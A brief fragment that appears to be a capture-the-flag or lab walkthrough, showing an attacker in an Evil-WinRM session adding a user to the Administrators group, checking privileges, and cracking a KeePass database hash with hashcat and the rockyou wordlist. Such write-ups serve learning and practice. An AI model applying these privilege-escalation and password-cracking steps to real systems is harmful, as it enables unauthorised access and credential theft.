...
Ill add the user to the Administrators group

Now ill log out of Evil-winrm and log back in 

```python
*Evil-WinRM* PS C:\Users\l_conrad\Documents> whoami /priv
...
Ill generate a usable hash

```python
hashcat keepass.hash /usr/share/wordlists/rockyou.txt.gz -m 13400 --username
